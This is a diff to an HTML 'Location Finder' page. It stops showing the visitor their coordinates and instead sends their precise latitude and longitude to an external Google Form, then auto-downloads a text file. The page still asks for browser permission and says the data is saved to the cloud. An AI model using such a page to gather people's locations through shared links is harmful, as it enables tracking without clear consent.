@@ -31,20 +31,19 @@
             width: 90%;
         }
 
-        .spinner {
-            width: 40px;
-            height: 40px;
-            margin: 20px auto;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid var(--primary);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            display: none;
+        button {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s;
         }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        button:hover {
+            background: #45a049;
         }
 
         .status {
@@ -63,32 +62,8 @@
             color: var(--error);
         }
 
-        .coordinates {
-            font-size: 1.2rem;
-            margin: 1rem 0;
-            padding: 1rem;
-            background: #f8f9fa;
-            border-radius: 8px;
-            font-family: monospace;
-        }
-
         .hidden {
             display: none;
-        }
-
-        button {
-            background: var(--primary);
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 8px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-
-        button:hover {
-            background: #45a049;
         }
     </style>
 </head>
@@ -96,12 +71,7 @@
     <div class="container">
         <h1>Location Finder</h1>
         <button onclick="requestLocation()">Click Here to Share Location</button>
-        
-        <div class="spinner" id="spinner"></div>
-        
         <div class="status hidden" id="statusMessage"></div>
-        
-        <div class="coordinates hidden" id="coordinates"></div>
     </div>
 
     <script>
@@ -112,64 +82,47 @@
             statusElement.classList.remove('hidden');
         }
 
-        function showCoordinates(lat, lon) {
-            document.getElementById('spinner').classList.add('hidden');
-            document.getElementById('coordinates').classList.remove('hidden');
-            document.getElementById('coordinates').innerHTML = `
-                Latitude: ${lat.toFixed(6)}<br>
-                Longitude: ${lon.toFixed(6)}
-            `;
-        }
+        async function saveToGoogleForms(lat, lon) {
+            // REPLACE WITH YOUR GOOGLE FORM ID
+            const formId = '1FAIpQLSdd-5vv11ZJ3nV87vVhB1Zj9jHkrFXMBy1z38xc2QX-QLyz3w';
+            const url = `https://docs.google.com/forms/d/e/${formId}/formResponse?usp=pp_url&entry.1234567890=${lat}&entry.0987654321=${lon}&submit=Submit`;
 
-        function saveToFile(lat, lon) {
-            const data = `Latitude: ${lat.toFixed(6)}, Longitude: ${lon.toFixed(6)}\n`;
-            fetch('/save-location', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ data }),
-            })
-            .then(response => response.json())
-            .then(result => {
-                console.log('Location saved:', result);
-            })
-            .catch(error => {
+            try {
+                await fetch(url);
+                updateStatus('Location saved to cloud!', 'success');
+                
+                // Create downloadable file
+                const data = `Latitude: ${lat}, Longitude: ${lon}\n`;
+                const blob = new Blob([data], { type: 'text/plain' });
+                const link = document.createElement('a');
+                link.href = URL.createObjectURL(blob);
+                link.download = 'test.txt';
+                link.click();
+                
+            } catch (error) {
                 console.error('Error saving location:', error);
-            });
+                updateStatus('Failed to save location.', 'error');
+            }
         }
 
         function requestLocation() {
-            const spinner = document.getElementById('spinner');
-            spinner.classList.remove('hidden');
-            updateStatus('Requesting location access...');
+            updateStatus('Requesting location...');
 
             if (!navigator.geolocation) {
-                updateStatus('Geolocation is not supported by your browser.', 'error');
+                updateStatus('Geolocation not supported', 'error');
                 return;
             }
 
             navigator.geolocation.getCurrentPosition(
                 (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    showCoordinates(lat, lon);
-                    updateStatus('Location found successfully!', 'success');
-                    saveToFile(lat, lon); // Save to server
+                    const lat = position.coords.latitude.toFixed(6);
+                    const lon = position.coords.longitude.toFixed(6);
+                    saveToGoogleForms(lat, lon);
                 },
                 (error) => {
-                    spinner.classList.add('hidden');
-                    if (error.code === error.PERMISSION_DENIED) {
-                        updateStatus('Location access was denied. Please enable it in your browser settings.', 'error');
-                    } else {
-                        updateStatus('Failed to retrieve location. Please try again.', 'error');
-                    }
+                    updateStatus('Location access denied', 'error');
                 },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 5000,
-                    maximumAge: 0
-                }
+                { enableHighAccuracy: true, timeout: 5000 }
             );
         }
     </script>
